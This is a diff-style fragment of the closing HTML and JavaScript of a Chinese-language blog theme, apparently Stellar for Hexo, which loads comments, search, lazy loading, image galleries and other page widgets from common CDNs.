+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
+
+<!-- optional -->
+
+  <script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'
+
+  function load_comment(){
+    if(!document.getElementById("waline_container"))return;
+
+    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
+    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');
+
+    const el = document.getElementById("waline_container");
+    var path = el.getAttribute('comment_id');
+    if (!path) {
+      path = decodeURI(window.location.pathname);
+    }
+
+    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
+      el: '#waline_container',
+      path: path,
+      
+    }));
+
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+<script type="text/javascript" src="/js/darkmode.js"></script>
+</div></body></html>
